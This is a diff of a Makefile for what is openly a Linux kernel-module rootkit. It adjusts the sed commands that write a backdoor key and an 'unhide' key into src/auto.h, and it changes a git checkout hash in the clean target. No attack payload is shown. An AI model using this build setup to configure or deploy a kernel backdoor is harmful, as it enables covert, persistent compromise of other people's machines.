@@ -46,8 +46,10 @@ all: persist
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
-	sed -i 's/^static uint64_t auto_bdkey = .*/static uint64_t auto_bdkey = $(BDKEY);/' src/auto.h
-	sed -i 's/^static uint64_t auto_unhidekey = .*/static uint64_t auto_unhidekey = $(UNHIDEKEY);/' src/auto.h
+	sed -i 's/^static uint64_t __attribute__((unused))auto_bdkey = .*\
+		/static uint64_t __attribute__((unused))auto_bdkey = $(BDKEY);/' src/auto.h
+	sed -i 's/^static uint64_t __attribute__((unused))auto_unhidekey = .*\
+		/static uint64_t __attribute__((unused))auto_unhidekey = $(UNHIDEKEY);/' src/auto.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo -n "Save this Backdoor KEY: "
 	@echo $(BDKEY) | sed 's/^0x//'
@@ -77,7 +79,7 @@ clean:
 	@rm -f *.o src/*.o $(persist)
 	@git checkout a6333fdc9e9d647b7d64e9e9cb1e6c0237a8967f \
 		-- src/persist.S 2>/dev/null || true
-	@git checkout a9d711472292ad23c284f701fc8848f2947cc224 \
+	@git checkout 9009bdf26631788551490a77ff9066acf4109f4d \
 		-- src/auto.h 2>/dev/null || true
 	@echo "Clean."
 
